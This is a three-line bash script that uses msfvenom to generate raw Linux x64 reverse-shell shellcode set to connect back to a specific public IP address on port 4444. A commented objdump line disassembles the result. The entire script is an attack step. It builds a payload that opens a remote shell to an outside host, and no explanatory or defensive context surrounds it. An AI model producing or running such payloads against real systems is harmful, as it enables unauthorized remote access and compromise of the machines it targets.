#!/bin/bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=134.209.227.158 LPORT=4444 -f raw > shellcode.bin
# objdump -b binary -m i386 -D shellcode.bin
